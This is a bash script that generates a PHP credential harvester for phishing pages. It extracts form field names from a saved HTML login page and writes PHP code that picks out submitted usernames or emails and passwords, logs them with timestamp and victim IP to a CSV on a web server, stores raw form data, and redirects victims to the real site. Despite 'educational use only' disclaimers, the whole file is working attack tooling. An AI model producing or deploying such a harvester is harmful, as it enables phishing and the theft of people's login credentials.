#!/bin/bash
# Form Parameter Extractor & PHP Harvester Generator (Universal Format)
# Author: You
# Purpose: Educational use only

# ANSI color codes for visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Banner
echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════╗"
echo "║                                                   ║"
echo "║    Form Parameter Extractor - Educational Tool    ║"
echo "║                                                   ║"
echo "╚═══════════════════════════════════════════════════╝"
echo -e "${NC}"

# Argument check
if [ "$#" -lt 1 ]; then
    echo -e "${RED}[!] Usage: $0 <html_file> [redirect_url]${NC}"
    echo -e "${YELLOW}    <html_file>: Path to the HTML file to analyze${NC}"
    echo -e "${YELLOW}    [redirect_url]: Redirect URL after submission (default: https://www.google.com/)${NC}"
    exit 1
fi

HTML_FILE="$1"
REDIRECT_URL="${2:-https://www.google.com/}"
OUTPUT_PHP="harvester.php"

# Verify HTML file
if [ ! -f "$HTML_FILE" ]; then
    echo -e "${RED}[!] Error: File '$HTML_FILE' not found.${NC}"
    exit 1
fi

echo -e "${BLUE}[*] Analyzing '$HTML_FILE' for form parameters...${NC}"

# Extract unique form parameters
PARAMS=$(grep -o 'name="[^"]*"' "$HTML_FILE" | sed 's/name="//g' | sed 's/"//g' | sort | uniq)

if [ -z "$PARAMS" ]; then
    echo -e "${RED}[!] No form parameters found in the file.${NC}"
    exit 1
fi

PARAM_COUNT=$(echo "$PARAMS" | wc -l)
echo -e "${GREEN}[+] Found $PARAM_COUNT unique form parameters.${NC}"

# Start writing the PHP harvester
echo -e "${BLUE}[*] Generating PHP harvester script...${NC}"

cat > "$OUTPUT_PHP" << EOL
<?php
// Universal Form Harvester - Auto-generated
// Author: You
// For educational use only

error_reporting(0);
date_default_timezone_set("UTC");

// Target CSV path on your local machine
\$csv_path = "/var/www/html/credentials.csv";
\$debug_log = "/home/kali/Desktop/My_Scripts/Phishing/Templates/debug_dump.log";

// Initialize values
\$username = "UNKNOWN";
\$password = "UNKNOWN";

// Try to identify username based on value heuristics
foreach (\$_POST as \$key => \$value) {
    \$value_trimmed = is_array(\$value) ? json_encode(\$value) : trim(\$value);
    if (\$username === "UNKNOWN" && preg_match("/^.+@.+\..+$/", \$value_trimmed)) {
        \$username = \$value_trimmed;
    }
}

// Fallback to key-based username if value-based fails
if (\$username === "UNKNOWN") {
    foreach (\$_POST as \$key => \$value) {
        \$lower = strtolower(\$key);
        \$value_trimmed = is_array(\$value) ? json_encode(\$value) : trim(\$value);
        if (preg_match('/(user(name)?|uname|login|email|id|un)/i', \$lower)) {
            \$username = \$value_trimmed;
            break;
        }
    }
}

// Password always based on key name heuristics
foreach (\$_POST as \$key => \$value) {
    \$lower = strtolower(\$key);
    \$value_trimmed = is_array(\$value) ? json_encode(\$value) : trim(\$value);
    if (preg_match('/(pass(word)?|pw|pword)/i', \$lower)) {
        \$password = \$value_trimmed;
        break;
    }
}

// Timestamp and IP
\$timestamp = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];

// CSV line format
\$csv_line = "\"\$username\",\"\$password\",\"\$timestamp\",\"\$ip\"\n";

// Write to CSV file
file_put_contents(\$csv_path, \$csv_line, FILE_APPEND);

// Save raw POST data for debugging (optional)
file_put_contents(\$debug_log, print_r(\$_POST, true), FILE_APPEND);

// Redirect user to real site
header("Location: $REDIRECT_URL");
exit();
?>
EOL

chmod +x "$OUTPUT_PHP"

echo -e "${GREEN}[+] PHP harvester script generated successfully: $OUTPUT_PHP${NC}"
echo -e "${YELLOW}[*] The script will capture likely username/email and password values based on content and key heuristics.${NC}"
echo -e "${YELLOW}[*] Data will be saved to: /var/www/html/credentials.csv${NC}"
echo -e "${YELLOW}[*] Raw POST data (for debugging) goes to: /home/kali/Desktop/My_Scripts/Phishing/Templates/debug_dump.log${NC}"
echo -e "${YELLOW}[*] Users will be redirected to: $REDIRECT_URL${NC}"
echo ""
echo -e "${RED}[!] IMPORTANT: This tool is for educational purposes only.${NC}"
echo -e "${RED}[!]
